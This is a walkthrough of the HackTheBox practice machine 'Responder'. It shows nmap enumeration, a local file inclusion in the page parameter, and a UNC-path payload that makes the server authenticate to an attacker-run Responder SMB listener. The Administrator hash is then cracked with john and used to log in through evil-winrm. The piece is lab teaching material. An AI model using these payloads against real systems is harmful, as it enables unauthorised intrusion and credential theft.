---
title: "HackTheBox - Responder"
author: Nasrallah
description: ""
date: 2022-06-25 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, lfi, responder, winrm, cracking, john]
img_path: /assets/img/hackthebox/machines/responder/
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello Hackers, I hope you are doing well. Today we are doing [Responder](https://app.hackthebox.com/starting-point?tier=1) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 -p- {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
PORT     STATE    SERVICE   VERSION
80/tcp   open     http      Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open     http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp filtered pando-pub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

The target is a windows machine having 2 open ports, port 80 running Apache web server as well as WINRM on port 5985.

### Web

Navigate to the web page. http://10.129.230.170/

![](1.png)

We get redirected to unika.htb . We need to add it to our hosts file (/etc/hosts)

![](2.png)

Now go to http://unika.htb/

![](3.png)

Looking through the page, we see a section where we can change language. When we change the option to GR, the website takes us to the German version of the website.

![](4.png)

In the URL we see the `german.html` page is loaded by the `page` parameter.

This might be vulnerable to LFI (**L**ocal **File** **I**clusion).

>LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
intended to be an option for this application. A common example is when an application uses the path to a
file as input. If the application treats this input as trusted, and the required sanitary checks are not
performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
execution as well.

## **Foothold**

Since this is a windows machine, one of the files we use to test for lfi is `C:\Windows\System32\drivers\etc\hosts`.

Now let's add that to the url and request the file.`http://unika.htb/index.php?page=C:\Windows\System32\drivers\etc\hosts`.

![](5.png)

Great! The target is vulnerable to LFI.

We are going to leverage that and get a NTLM hash using a tool called `Responder`.

When we run `Responder`, it will set up an SMB server listening for incoming connections. Then we'll attempt to perform the NTLM authentication to that server using the LFI we found. `Responder` sends a challenge back for the server to encrypt with the user's password. When the server responds, `Responder` will use the challenge and the encrypted response to generate the NetNTLMv2.

First, let's run Responder : `udo responder -I tun0`

![](6.png)

with the Responder server ready, we tell the server to include a resource from our SMB server by setting the page parameter: `http://unika.htb/index.php?page=//10.10.16.29/somefile`.

![](7.png)

Great! We not only got a hash, but it's Administrator's hash.

Put the hash in file so that we can crack it.

![](8.png)

Using john and rockyou wordlist, let's crack the hash.

![](9.png)

Great! Got Administrator's password.

We have seen earlier that Winrm service is running. Using a tool called `evil-winrm`, we can connect to that service as Administrator with the password we cracked. `evil-winrm -i 10.129.95.234 -u Administrator -p badminton`

![](9.png)

Excellent! We got in.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
